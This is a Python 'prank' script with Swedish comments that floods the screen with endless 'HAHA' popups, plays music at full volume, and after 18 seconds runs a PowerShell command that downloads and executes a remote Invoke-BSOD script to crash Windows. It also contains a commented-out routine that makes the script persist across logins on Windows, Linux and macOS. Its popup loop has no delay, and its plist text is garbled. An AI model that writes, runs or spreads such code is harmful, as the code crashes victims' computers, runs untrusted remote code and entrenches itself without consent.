import tkinter as tk
import random
import threading
import time
import pygame  # Importera pygame för ljudhantering
import os
import sys
import platform

def add_to_startup():
    # Hämtar den absoluta sökvägen till det skript som körs just nu
    script_path = os.path.abspath(sys.argv[0])
    system = platform.system()

    try:
        if system == "Windows":
            import winreg
            # Registret för den aktuella användaren (kräver inte admin)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            # Vi kör skriptet med python-tolken (sys.executable)
            winreg.SetValueEx(key, "MyPythonApp", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            winreg.CloseKey(key)
            print("[+] Tillagd i Windows Register (Run)")

        elif system == "Linux":
            # Använder XDG Autostart-standarden (körs när användaren loggar in i sitt GUI)
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_file = os.path.join(autostart_dir, "mypythonapp.desktop")
            
            content = f"""[Desktop Entry]
Type=Application
Name=MyPythonApp
Exec={sys.executable} {script_path}
Terminal=false
"""
            with open(desktop_file, "w") as f:
                f.write(content)
            # Gör filen körbar
            os.chmod(desktop_file, 0o755)
            print("[+] Tillagd i Linux XDG Autostart")

        elif system == "Darwin":  # macOS
            # Använder LaunchAgents för den aktuella användaren
            launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launch_agents_dir, exist_ok=True)
            plist_file = os.path.join(launch_agents_dir, "com.user.mypythonapp.plist")
            
            content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://apple.com">
<plist version="1.0">
<dict>
    <key>Label</key>
    < Wilk>com.user.mypythonapp</key>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
            with open(plist_file, "w") as f:
                f.write(content)
            print("[+] Tillagd i macOS LaunchAgents")
            
        else:
            print(f"[-] Okänt operativsystem: {system}. Kunde inte sätta autostart.")

    except Exception as e:
        print(f"[-] Misslyckades med att sätta autostart: {e}")

# --- KÖR KODEN ---

# COMMENT THIS OR UNCOMMENT IF YOU WANT:
#          add_to_startup()

def init_audio():
    """Initierar Pygames ljudsystem och laddar musiken."""
    pygame.mixer.init()
    
    # Starta bakgrundsmusik i en oändlig loop (-1)
    try:
        pygame.mixer.music.load("bakgrundsmusik.mp3")
        pygame.mixer.music.set_volume(1)  # Sänk volymen lite (0.0 till 1.0)
        pygame.mixer.music.play(-1)
    except pygame.error:
        print("Kunde inte ladda bakgrundsmusik.mp3 - spelar utan musik.")

def create_popup():
    # Skapa huvudfönstret för denna popup
    root = tk.Tk()
    root.title("Varning!")
    
    width = 300
    height = 150
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    x = random.randint(0, screen_width - width)
    y = random.randint(0, screen_height - height)
    
    root.geometry(f"{width}x{height}+{x}+{y}")
    
    label = tk.Label(root, text="HAHA", font=("Arial", 12))
    label.pack(expand=True)
    
    root.attributes('-topmost', True)
    root.after(12000, root.destroy)
    
    root.mainloop()



def bsod():
    import subprocess
    
    # Ditt PowerShell-kommando som en sträng
    powershell_cmd = "IEX((New-Object     Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-    BSOD.ps1'));Invoke-BSOD"
    try:
        # Kör kommandot via PowerShell
        result = subprocess.run(
            ["powershell", "-Command", powershell_cmd],
            capture_output=True,  # Fångar upp texten istället för att skriva ut den direkt
            text=True,            # Gör att output hanteras som text/strängar (istället for bytes)
            check=True            # Kastar ett Python-fel om PowerShell-kommandot misslyckas
        )
    
        print("Svar från PowerShell:")
        print(result.stdout)

    except subprocess.CalledProcessError as e:
        print("PowerShell-kommandot misslyckades!")
        print("Felmeddelande:", e.stderr)











def print_action():
    """Denna funktion körs automatiskt efter 18 sekunder."""
    bsod()

if __name__ == "__main__":
    print("Initierar ljud...")
    init_audio()
    
    print("Startar OÄNDLIGT popup-spam!")
    print("VIKTIGT: Tryck Ctrl+C i terminalen för att stänga av programmet.")
    
    # Starta en timer som kör funktionen print_action efter 18 sekunder
    # daemon=True gör att timern stängs av om du stänger huvudprogrammet med Ctrl+C
    timer = threading.Timer(18.0, print_action)
    timer.daemon = True
    timer.start()
    
    try:
        while True:
            # Skapa ett fönster i en egen tråd
            t = threading.Thread(target=create_popup)
            t.daemon = True 
            t.start()
            
            # Vänta 0.3 sekunder innan nästa fönster skapas
            
            
    except KeyboardInterrupt:
        print("\nStoppar programmet...")
        pygame.mixer.quit()
        print("Programmet avslutat.")
